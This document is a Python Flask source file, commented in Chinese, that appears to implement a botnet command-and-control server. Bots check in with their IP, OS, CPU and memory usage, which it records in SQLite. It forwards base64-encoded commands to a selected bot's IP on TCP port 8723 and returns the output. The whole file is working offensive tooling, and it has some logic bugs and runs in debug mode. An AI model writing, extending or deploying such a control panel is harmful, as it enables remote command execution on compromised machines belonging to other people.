import base64
import os
import socket
import sqlite3

from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

cmd = []

bots_list = []

@app.route('/api/bots') # 获得bot信息的接口
def get_bots():
    db_file = 'bots/bot.db'
    try:
        db_conn = sqlite3.connect(db_file)
        db_conn.row_factory = sqlite3.Row
        cursor = db_conn.cursor()
        cursor.execute('SELECT * FROM bots')
        bots = cursor.fetchall()
        bots_list = [dict(row) for row in bots]
        return bots_list, 200
    except Exception as e:
        print(e)

@app.route('/bots')
def bot_dashboard():
    return render_template('cc.html')

@app.route('/bots/cmd')
def bot_cmd():
    return render_template('cmd.html')

@app.route('/bots/execute' ,methods=['GET', 'POST']) # 命令执行
def bot_execute():
    try:
        # 解码 Base64 请求体
        encoded_data = request.get_data(as_text=True)
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')

        # 解析 ID 和命令（格式：ID:命令）
        if ':' not in decoded_data:
            return "Invalid format", 400
        checkid, command = decoded_data.split(':', 1)

        # 通过 ID 查找 IP
        ip = checkbotid(checkid)
        if not ip:
            return base64.b64encode("设备不存在".encode('utf-8')).decode('utf-8')
        # Socket 通信
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cmd:
            cmd.settimeout(10)
            cmd.connect((ip, 8723))
            cmd.send(command.encode('utf-8'))
            # 接收响应
            output = cmd.recv(1024)
            if not output:
                output = base64.b64encode(f"No information".encode('utf-8')).decode('utf-8')
                return output
            return output, 200

    except Exception as e:
        error_msg = base64.b64encode(f"执行失败: {str(e)}".encode('utf-8')).decode('utf-8')
        return error_msg, 500

def checkbotid(checkid):
    for bot in bots_list:
        if bot["id"] == int(checkid):
            return bot["ip"]
    return None

# 接口客户端返回本地信息 测试过了
@app.route('/api/getbot', methods=['GET', 'POST'])
def bot_checkbot():
    db_file = os.path.abspath('bots/bot.db')  # 使用绝对路径
    try:
        # 初始化数据库
        if not os.path.exists(db_file):
            if init_db(db_file):
                return jsonify({'success': True, 'message': '数据库及表结构初始化完成'})


        if request.method == 'POST':
            data = request.form.to_dict()

            required_fields = ['ip', 'status', 'os', 'cpu_usage', 'memory_usage']
            if not all(field in data for field in required_fields):
                return jsonify({'success': False, 'message': '缺少必要字段'}), 400

            db_conn = sqlite3.connect(db_file)
            cursor = db_conn.cursor()
            try:
                insert_sql = '''
                INSERT INTO bots (ip, status, geo, os, cpu_usage, memory_usage)
                VALUES (?, ?, ?, ?, ?, ?)
                '''
                cursor.execute(insert_sql, (
                    data['ip'],
                    data['status'],
                    data.get('geo', 'Unknown'),  # 默认值
                    data['os'],
                    float(data['cpu_usage']),  # 转换为浮点数
                    float(data['memory_usage'])  # 转换为浮点数
                ))
                db_conn.commit()
                return jsonify({'success': True, 'message': '数据插入成功'})
            finally:
                db_conn.close()

        return jsonify({'success': True, 'message': '无需再次初始化'})

    except Exception as e:
        return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500

def init_db(db_file):
    db_dir = os.path.dirname(db_file)
    if not os.path.exists(db_dir):
        os.makedirs(db_dir)

    need_init = not os.path.exists(db_file)
    db_conn = sqlite3.connect(db_file)
    cursor = db_conn.cursor()

    try:
        if need_init:
            create_table_sql = '''
            CREATE TABLE bots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                status TEXT CHECK(status IN ('online', 'offline')),
                geo TEXT DEFAULT 'Unknown',
                last_online DATETIME DEFAULT CURRENT_TIMESTAMP,
                os TEXT,
                cpu_usage REAL,
                memory_usage REAL
            );
            '''
            cursor.execute(create_table_sql)
            db_conn.commit()
            return True
        return False
    finally:
        db_conn.close()



if __name__ == '__main__':
    app.run(debug=True)